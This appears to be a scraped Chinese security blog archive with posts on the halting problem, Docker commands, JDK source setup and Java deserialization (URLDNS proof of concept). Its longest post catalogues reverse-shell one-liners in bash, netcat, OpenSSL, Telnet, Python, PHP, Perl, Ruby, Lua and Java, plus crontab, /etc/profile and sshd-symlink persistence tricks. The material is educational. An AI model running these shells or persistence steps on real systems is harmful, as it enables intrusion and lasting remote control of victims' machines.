A负责计算两个数的和，例如输入3、5，输出就是8； C负责计算棋局下一步的最优解； A &amp; C 都泛指正常的计算机程序：接收输入，输出结果。 对于只要能正常输出结果(不管结果对错)的程序，都可以称为该程序可以停机。 对于程序陷入了死循环等问题，导致迟迟没有结果的输出的局面，那么该程序无法停机。 比如说A、C互换输入，那么就会导致出现停机。 这时候我们想有一台上帝的杰作H，H就是传说中的“上帝之眼”，给它读入任意一台机器的蓝图，以及任意一个问题（输入）后，它都能根据蓝图模拟出该机器的运作过程，从而判断出哪些问题（输入）会导致该机器出错（即无法停机），哪些问题则不会出错（即成功停机）： 那么这个H真的存在么？ 接下来逻辑证明H是不存在的： 注意H的大前提是可以为任意程序蓝图+任意输入判断是否停机。 假设现在有一个机器X： X由3部分组成：P、H、N P负责将输入一分为二； H是“上帝之眼” N是反转器： 如果H给出的结果是not stuck，那么N的结果就是stuck； 如果H给出的结果是stuck，那么N的结果就是not stuck:) 现在，如果我们把X自身的蓝图给X，会发生什么？ 此时H就会对X的蓝图判定，输入是X蓝图的情况下会发生什么？ 如果H给出的是not stuck，那么X最终的输出结果就是stuck，相悖！ 如果H给出的是stuck，那么X最终的结果就是not stuck，相悖！ 所以X自身就是一个反例，因此逻辑层面就会证明，世界上根本不存在H。 程序分析技术栈canliture师傅","categories":[{"name":"静态分析","slug":"静态分析","permalink":"https://0range228.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"}],"tags":[{"name":"静态分析理论基础","slug":"静态分析理论基础","permalink":"https://0range228.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/"}]},{"title":"反弹shell姿势总结","slug":"反弹shell姿势总结","date":"2021-06-08T12:01:51.000Z","updated":"2021-06-15T01:33:20.135Z","comments":true,"path":"反弹shell姿势总结/","link":"","permalink":"https://0range228.github.io/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/","excerpt":"序言 曲径通幽处，禅房花木深。 抽空总结一下nc经典用法以及反弹shell的多种姿势。","text":"序言 曲径通幽处，禅房花木深。 抽空总结一下nc经典用法以及反弹shell的多种姿势。 linux文件描述符和重定向在反弹shell的时候疑惑，神奇的&amp;、&lt;、&gt;都是用来做什么的？ 没错，他们就是负责将文件描述符重定向的。 文件描述符linux跟踪打开的文件，并且分配给他一个数字，这个数字用于充当句柄。 linux启动的时候会自动启动三个文件描述符： stdin 标准输入 0 键盘 stdout 标准输出 1 显示器 stderr 错误输出 2 显示器 之后再打开文件，数字自动递增 并且所有的shell命令都会默认拥有这三个描述符（0，1，2） 举个例子，如果我们想要把输出的内容输出到文件中，或者想从文件中读取输入，我们需要的是： 修改数字 ，将文件描述符重定向。 重定向两种： 输入重定向 &lt; 输出重定向 &gt; 记忆方法：在命令行中，命令总是在左侧，而重定向符号“指向”数据流动 默认的重定向会覆盖文件内容，如果想追加 ，可以&lt;&lt; 、&gt;&gt; 一般0、1、2都写在左侧 当解析器解析到重定向符号的话，就会先处理重定向。 就像下面这个小例子： 输入：输入流默认是0，修改了0的指向，让它指向file.txt，cat自然就会去读标准输入流 12345# 打印文件内容cat 0&lt; file.txtcat &lt; file.txt0&lt; file.txt cat&lt; file.txt cat 输出：输出流默认是1，修改了1的指向，将输出内容输出到文件file.txt中。 12345#（覆盖）echo hello &gt; file.txtecho hello 1&gt; file.txt&gt; file.txt echo hello1&gt; file.txt echo hello 将命令结果输出到文件： 12mkdir &amp;&gt; result.txtls &amp;&gt; result.txt 文件描述符的操作模糊输出 &gt;&amp; &lt;&amp; 正确、错误都输出到同一个地方（1，2） 文件描述符重定向 n&lt;&amp;m n&gt;&amp;m 以上两种模式都是将n复制到m，只不过分别是只读/写，两种模式 因此对于 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响） 2&gt;&amp;1 意思就是把 标准错误输出 重定向到(指向) 标准输出， &amp; 目的是为了区分数字名字的文件和文件描述符 如果没有&amp;，系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符 那么下面两种命令是等价的 12mkdir &amp;&gt; result.txtmkdir &gt; result.txt 2&gt;&amp;1 命令的顺序系统读取shell命令永远是从左到右 顺序不同导致结果不同 举个例子 1234mkdir &gt; result.txt 2&gt;&amp;1# 首先将标准输出重定向到了result.txt，接下来把标准错误输出指向了标准输出，等量代换，最终就是标准错误输出指向指向result.txtmkdir 2&gt;&amp;1 &gt; result.txt# 首先将标准错误输出指向了标准输出，接下来又把标准输出指向了result.txt，导致链断掉 exec I/O重定向 exec命令就是以新的进程去代替原来的进程，但进程的PID保持不变。因此，可以这样认为，exec系统调用并没有创建新的进程，只是替换了原来进程上下文的内容。原进程的代码段，数据段，堆栈段被新的进程所代替。 举个例子: 1234exec 55&lt;&gt;test.txt # 创建一个新描述符55 该进程所有的输出重定向到result.txt文件下ls &gt;&amp;55cat test.txt # 命令都输出在test.txt里面exec 55&gt;&amp;- # 销毁55号描述符 NetCat基本用法几个重要参数： 12345-l 开启监听模式-v 显示详细信息-vv 显示超级详细信息-p 本地端口 -e 程序重定向 -e /bin/sh 测试环境： 12攻击机：A受害机：B 正向连接shell原理： 受害主机将bash交付给5555端口，攻击机连接5555端口即可 12B:nc -lvvp 5555 -e /bin/shA:nc [A's IP] 5555 反向连接shell原理： 攻击机打开自己的6000端口，受害主机主动把自己的shell发送给6000端口 12A:nc -lvpp 6000B:nc [A's IP] 6000 -e /bin/sh 反弹shell多种姿势利用Bash先写姿势： 12bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1bash -c \"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\" 之前简单介绍了借助nc来实现，其实bash自己就可以做到发送shell Attacker: nc -lvvp 2333 Victim: bash -i &gt;&amp; dev/tcp/[attacker&#39;s ip]/2333 0&gt;&amp;1 一步步看： bash -i 开启交互模式 /dev/tcp/ip/port 这是一个十分特殊的文件，直接访问它是不存在的 但是如果现在有主机A在ip+port监听，那么你对它读写。就可以实现与A的socket通信 比如: 攻击机：echo “hello” &gt; /dev/tcp/[attacker’s ip]/6000 就可以将hello通过socket通信，发送到受害者主机 再比如： 攻击机在nc -lvvp 6000开启本地端口之后，随便在键盘写点东西 这时候如果受害机cat &lt; /dev/tcp/[attacker&#39;s ip]/6000 就可以看到刚才输入的数字 bash -i &gt; /dev/tcp/ip/port 这条命令就是将受害机的输出重定向到ip+port上 这时候在受害机输入任何命令，结果都会显示在攻击者主机上 bash -i &lt; /dev/tcp/ip/port 上一个命令仅仅是接受受害机的输入，将命令结果定向到攻击机。还差点意思 这条命令就是将受害机输入也重定向到Socket的输入 bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 现在合二为一，这条命令解释一下就是： 顺序肯定是从左向右，首先将输出1重定向到socket，然后把输入0定向到1，也就是socket 这样一来，输入和输出都定向到了socket，也就是/dev/tcp/ip/port 这样就形成了一个回路，完成了远程shell的交互。 但是这样在受害机还是能看到有操作痕迹，我们希望”悄无声息”的进行shell交互 这就需要用到模糊输出，以下两种格式都可以： 12bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1 末尾的0&gt;&amp;1和0&lt;&amp;1除了打开方式不同 在这里没区别 看个人习惯 第二个命令里面 &gt;&amp; &amp;&gt;都可以 借助exec1exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done 原理： 新建了一个文件描述符，标号5，让5结合exec重定向到socket 接下来，将输入设置为5指向的socket 后半段：while read line;do $line &gt;&amp;5 2&gt;&amp;1;done 拆开就是: 123while read linedo $line &gt;&amp;5 2&gt;&amp;1done 首先从socket中读取一行，复制给line变量 接下来执行line变量（这一行的内容），然后将结果输出到socket，done结束 类似的还可以： 10&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 应用： 配合curl 将一句话写入受害主机的index.php 然后curl ip | bash 写入crontab定时任务，但是必须知道用户名 一般来说，一般都是root centos：/var/spool/cron/root debian：/var/spool/cron/crontabs/root 123456*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1#每隔一分钟，发送shell# 一句话版本crontab -l;printf \"* * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\\n\")|crontab - 写入/etc/profile配置文件中 1/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 &amp; 利用NetCat刚刚提到了，再写一遍： 受害者主机回连： 1nc -e /bin/sh ip 4000 如果-e 参数用不了怎么办？ 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip 4000 &gt;/tmp/f mkfifo首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。 还可以： 1mknod backpipe p; nc ip 4000 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe 利用协议利用OpenSSL先生成自签名证书，一路回车： 1openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes 首先在攻击机上开放4000端口： 1openssl s_server -quiet -key key.pem -cert cert.pem -port 4000 此时 OpenSSL 便在攻击机的4000端口上启动了一个 SSL/TLS server。 1mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect ip:port &gt; /tmp/s; rm /tmp/s 利用Telnet方法1：单端口 12nc -lvvp 2333mknod a p; telnet attacker_ip 2333 0&lt;a | /bin/bash 1&gt;a 方法2：双端口 1234nc -lvvp 4000nc -lvvp 5000# 4000 输入 5000输出telnet ip 4000 | /bin/bash | telnet ip 5000 利用SSH12345受害主机执行:ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=5000; 攻击机器:ssh root@victim_ip -p 5000 [用户名root,密码随意] 利用各种语言脚本攻击机ip，监听port python1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' php1php -r '$sock=fsockopen(\"ip\",port);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' perl1perl -e 'use Socket;$i=\"ip\";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;' ruby123ruby -rsocket -e 'c=TCPSocket.new(\"ip\",\"port\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end'或ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"ip\",\"port\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end' Lua1lua -e \"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\" Java12345678910111213public class Revs &#123; /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception &#123; // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= &#123;\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\"&#125;; Process p = r.exec(cmd); p.waitFor(); &#125;&#125; 参考1 2 3 4 netcat用法 netcat使用方法","categories":[{"name":"工具","slug":"工具","permalink":"https://0range228.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://0range228.github.io/tags/shell/"}]},{"title":"Docker学习笔记","slug":"Docker学习笔记","date":"2021-05-19T03:17:25.000Z","updated":"2021-10-03T01:56:27.264Z","comments":true,"path":"Docker学习笔记/","link":"","permalink":"https://0range228.github.io/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"序言 欲穷千里目，更上一层楼。 在调试漏洞的过程中会密切地和Docker打交道，总结一下Docker的操作。","text":"序言 欲穷千里目，更上一层楼。 在调试漏洞的过程中会密切地和Docker打交道，总结一下Docker的操作。 基本概念Docker包括三个基本概念： 镜像Image 容器Container 仓库Repository 镜像就像类，容器就像实例。 容器的实质是进程，容器进程属于自己独立的命名空间，也就是进程隔离 仓库是镜像的存储分发，默认仓库内的镜像是&lt;仓库名&gt;:&lt;Tag&gt;，默认tag是latest 对于一个ubuntu仓库来说： ubuntu是仓库的名字，ubuntu：16.04和ubuntu:18.04则是两个不同标签代表不同版本。 仓库通常是两段式命名，例如ownername/nginx 前者是用户名，后者是镜像。 镜像获取镜像1docker pull [args] [域名[：端口号] /] 仓库名[:标签] docker pull --help看细节 docker仓库地址：&lt;域名/IP&gt;[:端口号] 默认地址是docker.io 仓库名：&lt;仓库名/软件名&gt; 仓库名不写，默认是library，也就是官方镜像 比如：docker pull ubuntu:18.04 完整仓库名就是：docker.io/library/ubuntu:18.04 运行镜像1docker run -i -t --rm ubuntu:18.04 /bin/bash 解读： -i参数是启动容器内交互式操作模式 -t参数是在容器内开启一个终端 --rm代表容器退出后随之将该容器删除，不必再手动rm bash就是给容器的命令，这里我们希望得到交互式shell，所以打开bash 其他参数： -d可以让容器在后台运行 -p exit退出容器 列出镜像12docker image lsdocker images -a 参数： docker image ls -q只显示image的id docker image ls ubuntu只显示仓库名是ubuntu的image 删除本地镜像123docker image rm [args] &lt;image's id/reponame/&gt;docker rmi -f 镜像iddocker rmi -f $(docker images -aq) #删除全部镜像 参数： 这里面的image&#39;s id通常可以是长ID12位，也可以仅仅是前3位短id 配合docker image ls 1docker image rm $(docker image ls -q redis) #删除所有仓库名为 redis 的镜像 搜索镜像1docker search mysql 提交镜像1docker commit -m \"xxx\" -a=\"author\" 镜像id 目标镜像名：TAG 保存在本地 容器新建&amp;启动1docker run ubuntu:18.04 /bin/echo \"helloworld\" 没有的镜像，会自动pull 守护态运行1docker run ubuntu /bin/sh -c \"while true; do echo hello world; sleep 1; done\" 会将结果打印在本地终端，这里需要启动-d参数，来让容器在后台运行： 1docker run -d ubuntu /bin/sh -c \"while true; do echo hello world; sleep 1; done\" 就不再会打印到本地终端。 使用docker logs 86d4eab113a908ce2ee49fa46145623d62a290a76ab3807429588f7c2868bd6来查看 输出内容会在日子里体现出来， 查看运行中的容器123docker container lsdocker ps # 查看正在运行的容器docker ps -a # 查看历史运行过的容器 对比可以发现，刚才那一长串才是完整ID 查看自动容器的日志： 1docker container logs [id or name] 终止&amp;重启容器首先，当容器内的程序结束时，容器也将自动终止。 对于一般情况，可以使用docker container stop [id or name]来终止 终止状态的docker信息可以docker container ls -a来查看 在容器内部 exit退出并终止容器 ctrl+p+q 退出但不终止容器 对于已经停掉的容器，重新启动可以docker container start [id or name] 对于正在运行的容器，强制重新启动可以docker container restart [id or name] 删除全部容器： 12docker rm -f $(docker ps -aq)docker ps -aq | xargs docker rm 进入容器attach和exec都可以，更推荐exec 1234docker container lsdocker exec -it [shortid] /bin/bash # 进入容器后开启新的终端docker attach [shortid] # 进入容器当前正在执行的终端 原因： -it一起使用时，可以进入交互模式，并且可以看到熟悉的linux命令提示符 容器的导出&amp;导入导出 1docker export id &gt; ubuntu.tar 导入 1234$ cat ubuntu.tar | docker import - test/ubuntu:v1.0$ docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEtest/ubuntu v1.0 9d37a6082e97 About a minute ago 171.3 MB 也可以通过网址来import： 1$ docker import http://example.com/exampleimage.tgz example/imagerepo 删除容器删除正在运行的容器 1docker container rm -f [id or name] 删除所有容器 1docker container prune 外部网络访问容器1docker run -d -P nginx -P参数的意思就是随机打开一个本地端口 查看访问日志； 1docker logs id -p 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有 ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort。 1-p 55500:80 意思就是本机的55500端口映射给80端口 1-p 80:80 的意思就是映射全部端口。 比较： 123-p 80:80 绑定对应所有端口-p 127.0.0.1:80:80 指定映射使用一个特定地址-p 127.0.0.1::80 绑定本地的任意端口给容器的80端口 查看端口映射的配置 1docker port id 80 查看当前所有的网络配置 · 查看容器元数据1docker inspect 容器id 额外的备忘命令1234567891011121314151617181920212223242526272829# 查看当前运行的容器docker ps# 查看所有容器，包括停止的docker ps -a# 查看最新创建的容器，只列出最后创建的docker ps -l# 查看网络端口docker port [容器ID|容器名]# 查看容器内部的标准输出docker logs [容器ID|容器名]# 查看容器内部运行的进程docker top [容器ID|容器名]# 查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息docker inspect [容器ID|容器名]# 删除指定镜像docker rmi image_id# 删除容器，删除容器时，容器必须是停止状态docker rm [容器ID|容器名]# 删除所有的容器docker rm $(docker ps -aq) 容器数据卷 容器之间数据共享的技术，将容器内部的目录，挂载到宿主机上 命令挂载-v 主机目录:容器目录 数据映射 Dockerfiledocker的构建文件，本质为命令脚本 镜像多层，命令多行 1docker build -f Dockerfile -t 镜像名:版本 . 常用命令CMD docker run 会执行 12CMD [\"ls\",\"-a\"]&amp;&amp; 拼接 参考Docker-入门到实战 MacOS Docker安装和使用","categories":[{"name":"工具","slug":"工具","permalink":"https://0range228.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://0range228.github.io/tags/Docker/"}]},{"title":"记一次对线rt.jar","slug":"记一次对线rt-jar","date":"2021-05-13T06:39:35.000Z","updated":"2021-05-25T13:20:52.825Z","comments":true,"path":"记一次对线rt-jar/","link":"","permalink":"https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/","excerpt":"序言 独立三边静，轻生一剑知。 记录一次对线rt.jar的经历。","text":"序言 独立三边静，轻生一剑知。 记录一次对线rt.jar的经历。 过程全记录前一阵在复习CC链的时候，想着从PoC来逆向分析ysoserial师傅们的挖掘思路。 LazyMap函数的get函数很有挖掘潜力，所以我需要找哪些类调用了get方法。 已知答案是AnnotationInvocationHandler的invoke函数调用了get函数，可以执行下去。 现在我想用IDEA搜索一下，但是无奈没有找到。 发现这个类属于sun.reflect.annotation包，位于rt.jar中，主动去搜索这个类你是可以看到的。 IDEA可以反编译出来rt.jar的源码，但是不会帮你进去搜索代码细节，因为它没有源码 直接去翻$JAVA_HOME，src.zip里面是jdk源码，但是并没有sun包。。 搜索资料，我发现sun是oracle选择闭源的几个包之一。 Oracle选择性闭源？无奈又好笑，这能忍？ 如何拿到rt.jar的源码，火速学习了一波。 所以我想着先去搞到openJDK7的源码。 搜了一波，发现http://hg.openjdk.java.net/可以搞到源码，网速感人，要有耐心。。。 以我自己的7u21为例子： 点击jdk7u-jdk，进去之后点击browse可以看内容 也可以不废话，直接点击zip下载 然后就拿到了一个zip解压： 然后依次进入src-share-classes，看到了sun： 也就是说，IDEA无法帮我们搜索的内容，我们现在可以自己添加进去了。 如何关联？ 来到Project Structure - SKDs，把我们的源码的classes添加进去就可以了 这次再搜索一下，直接find in path 搜索path 就可以看到了： 翻出了JD-GUI，比较一下。 我是直接来到$JAVA_HOME，进入jre/lib，这些东西会参与java-runtime 啪的一下很快奥！ 不得不佩服西方老师傅门的耐心，漏洞在牛角尖上。 参考获取openJDK源码 JDK（rt.jar）源码和IDE关联 http://hg.openjdk.java.net/","categories":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"https://0range228.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"实战记录","slug":"实战记录","permalink":"https://0range228.github.io/tags/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"}]},{"title":"Java反序列化利用链补全计划","slug":"Java反序列化利用链补全计划","date":"2021-05-11T08:19:57.000Z","updated":"2021-07-19T11:50:37.607Z","comments":true,"path":"Java反序列化利用链补全计划/","link":"","permalink":"https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/","excerpt":"序言 温故而知新。 站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。 同步项目：Gadgets","text":"序言 温故而知新。 站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。 同步项目：Gadgets 写在最前面Java反序列化RCE三要素：readobject反序列化利用点 + 利用链 + RCE触发点。 审计maven仓库里面的jar包时，记得先拿到源码： 点右上角download source 下载pom.xml里面声明的依赖jars：mvn dependency:resolve -Dclassifier=sources JD-GUI … readObject源码分析梦开始的地方。 正常使用反序列化，就会执行java.io.ObjectInputStream类中的readObejct方法。 重点分析readObject0方法，它是核心方法。跟进去看： 这里最重要的是进行了对象类型的选择，根据不同类型执行操作。 这里会先执行readOrdinaryObject方法，unshared是false。 进去看看： 看到点眉目了，readSerialData其实才是真正反序列化对象，进入readSerialData函数看看： 到这里，可以理清整个过程的关键步骤了。 在readSerialData中比较关键的是这个判断条件： 其中slotDesc.hasReadObjectMethod()获取的是readObjectMethod这个属性，如果反序列化的类没有重写readobject()，那么readObjectMethod这个属性就是空，如果这个类重写了readobject()，就会执行readObject()方法。 所以这也就是为什么，挖掘这类漏洞，上来第一件事就是要：找到哪些类有重写readObject()方法。 2021.5.24更新 最近发现有个神奇的方法defaultReadObject 他的javadoc如下： 前面写到： 读取非静态和非transient修饰的属性，并且只能被readObject方法调用 懵懵的，写个demo实验一下： 会输出： 1Hello，world！ 可以看到，Example类自己实现了readObject方法，并且在它内部还有一个defaultReadObject方法。 我们把它删掉会怎样？ 答：这次输出是null，也就是s属性没有被序列化出来 所以defaultReadObject的作用就是执行流中对象默认的readObject方法，将对象的field反序列化出来。 还发现一个细节，为什么defaultReadObject的参数是一个ObjectInputStream参数？ 看下图，是因为如果一个类自己实现了readObject方法，内部机制会invoke这个方法，参数就是当前流。 一句话总结，defaultReadObject方法一般用于自己实现的readObject方法中，需要一个流对象作为参数。 用来执行流中对象默认的readObject方法，将对象反序列化出来。 如果我们自定义序列化过程仅仅调用了这个方法而没有任何额外的操作，这其实和默认的序列化过程没任何区别。 多说几句： 有了defaultReadObject方法之后，就可以用户自主控制反序列化过程了。 比如说一个字段是加密的，我们可以在readObject方法中先调用defaultReadObject方法来将其他字段来正常反序列化出来，再在最后执行加密字段的追加append。 URLDNS readobject反序列化利用点 + DNS查询，主要用来确认反序列化漏洞利用点的存在。 最适合新手分析的反序列化链。ysoserial的一部分。 只依赖原生类，没有jdk版本限制。 dnslog平台可以选择：DNSLog.cn，ceye，我选择了DNSLog。 漏洞复现jdk版本：jdk8u162，网上PoC很多，这里用lalajun师傅的为例。 123456789101112131415161718192021222324252627public class URLDNS &#123; public static void main(String[] args) throws Exception &#123; //0x01.生成payload //设置一个hashMap HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); //设置我们可以接受DNS查询的地址 URL url = new URL(\"http://oh6pfs.dnslog.cn\"); //将URL的hashCode字段设置为允许修改 Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); //**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）** //1. 设置url的hashCode字段为0xdeadbeef（随意的值） f.set(url, 0xdeadbeef); //2. 将url放入hashMap中，右边参数随便写 hashMap.put(url, \"rmb122\"); //修改url的hashCode字段为-1，为了触发DNS查询 f.set(url, -1); //0x02.写入文件模拟网络传输 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"out.bin\")); oos.writeObject(hashMap); //0x03.读取文件，进行反序列化触发payload ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"out.bin\")); ois.readObject(); &#125;&#125; 成功触发dns查询记录： 漏洞分析三要素：HashMap / URL / HashCode 大体流程： new一个HashMap对象，key-value对为URL-String类型，key设置为我们的dnslog的地址 暴力反射，将URL类的hashCode字段改为public，默认是private 将url对象的hashCode字段随便改成一个值 将url对象放入HashMap中作为key，value也随便写一个 将f对象的hashCode字段改为-1，触发漏洞 最终的payload结构是 一个HashMap，里面包含了 一个修改了hashCode为-1的URL类对象。 由于HashMap类自己有实现readObject方法，那么在反序列化过程中就会执行他自己的readObject。 搞懂HashMap HashMap 可以看作是一个链表散列的数据结构 , 也就是数组和链表的结合体. 对于主干来说，当要存放一个entry的时候，步骤如下： 计算key的hash：hash(k) 通过hash(k)映射到有限的数组a的位置i 在a[i]的位置存入value 自然就会想到，如果哈希冲突了怎么办？HashMap对于不同的元素，如果hash值相同，会采用链表指针的方式来挂在后面。 HashMap的主干是一个Entry数组，主干数组的长度一定是2的次幂。 Entry是HashMap的基本组成单元，每一个Entry包含一个key-value键值对。（其实所谓Map其实就是保存了两个对象之间的映射关系的一种集合） 看源码： 12345678910111213141516171819//jdk7transient Entry&lt;K,V&gt;[] table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;//Entry是HashMap中的一个静态内部类。static class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final K key; V value; Entry&lt;K,V&gt; next;//存储指向下一个Entry的引用，单链表结构 int hash;//对key进行hash运算后得到的值，存储在Entry中，避免重复计算 /** * Creates new entry. */ Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h;&#125; 看图： HashMap.readObject()看源码（跳过一些初始化操作）： putVal是向Map存放Entry的操作，在放入时会计算key的hash作为转化为数组位置i的映射依据。 DNS查询正是在计算URL类的对象的hash的过程中触发的，即hash(key)。 看hash()方法源码： 不同对象的hash计算方法是在各自的类中实现的，如果传入的key是一个URL对象，这里key.hashCode()就会调用URL类中的hashCode方法：java.net.URL#hashCode。 java.net.URL#hashCode 源码： 仔细看，用到了两个field： transient URLStreamHandler handler; // handler是一个transient临时类型，它不会被反序列化（但之后会用到） private int hashCode = -1; //hashCode是private类型，需要手动开放控制权才可以修改。 12345678public synchronized int hashCode() &#123; //如果hashCode不为-1，直接返回hashCode的值 if (hashCode != -1) return hashCode; //如果hashCode为-1，直接计算handler的hashcode，并返回 hashCode = handler.hashCode(this); return hashCode;&#125; 那就继续看handler所属的类：URLStreamHandler getHostAddress也是限制了IP地址不会解析： 这里面必须提一下上面的hostAddress参数，如果 Host 字段为一个域名 , 且我们之前解析过这个域名 , 那么程序会将解析后的 IP 地址缓存到 hostAddress 参数中 , 当我们再次请求时 , 由于 hostAddress 已有值 , 就不会走完剩下的 POP Chain 了。 继续跟，会到java.net.InetAddress#getAllByName()这个方法： 进入getAllByName0: 总结一下到目前为止可以利用的调用链： HashMap.readObject() -&gt; HashMap.hash() HashMap.hash() -&gt; URL.hashCode() URL.hashCode() -&gt; URLStreamHandler.hashCode() URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress() URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName() -&gt; … -&gt; getAddressFromNameService() 漏洞利用满足两个条件： 为了能走到URL.hashCode()，要保证map里面存放着一个Entry，这个Entry的key满足URL类型 为了能走到URLStreamHandler.hashCode()，需要hashCode这个field为-1，绕过if判断 往前翻PoC： 12345...f.set(url, 0xdeadbeef); hashMap.put(url, \"rmb122\");f.set(url, -1);... 为什么这里首先给url的hashCode属性先设置成一个值，put到map之后，再改成另一个值？ 这里我们先做一件事，看一下之前提到的HashMap.readObject()方法： 这里面的s其实是ObjectInputStream对象。既然key和value都是从s.readObejct()方法出来的(之后进行了cast强转)，那我们先看一下对应的HashMap.writeObject方法： 跟到internalWriteEntries方法： 可以看到，分别对entry内部的key和value进行了writeObject，tab的值即HashMap中table的值，也就是横向数组。 想一下，如果你想向一个HashMap中存放一个entry，那么就要执行HashMap.put()方法： 再看一下HashMap的put方法： 可以看到，这里用到了HashMap.hash()方法，如果这里面的key就是URL，那么后续利用链就能接上。 也就是说，仅仅一次put操作，就会触发一次DNS查询。 1234567public class DNSTest &#123; public static void main(String[] args) throws Exception &#123; HashMap map = new HashMap(); URL url = new URL(your_dns_url); map.put(url,123); //此时就会产生一次dns查询 &#125;&#125; 这里就可以回答之前的问题： 为什要改两次，因为我们要规避掉put操作产生的DNS查询。 之后再改回-1，是为了可以成功触发反序列化时候的漏洞。 也就是这里还有一条小链： HashMap.put() -&gt; HashMap.hash() HashMap.hash() -&gt; URL.hashCode() … 触发DNS查询 ysoserial实现版本十分优雅 这里首先有一个SilentURLStreamHandler对象，跟进去看看： 可以发现这个类其实就是继承URLStreamHandler类，并且把这两个方法改成了返回null，这样就规避了在生成payload的时候的那一次DNS查询，也就是我们之前看到的HashMap.put的那次操作。 这次put的时候，由于handler是SilentURLStreamHandler类，完全不会出发DNS解析，实在是妙。 Commons-Collections“不是夸你们Oracle呢，CC链确实让我们没饿死” 这里主要是ysoserial已经有的cc1-7漏洞，以及记录一些其他师傅们发现的。 cc的背景可以去看之前的文章温习。 cc1条件： cc3.1～3.2.1 jdk 1.7(8u71之前都可以) maven： 1234567&lt;dependencies&gt; &lt;dependency&gt; 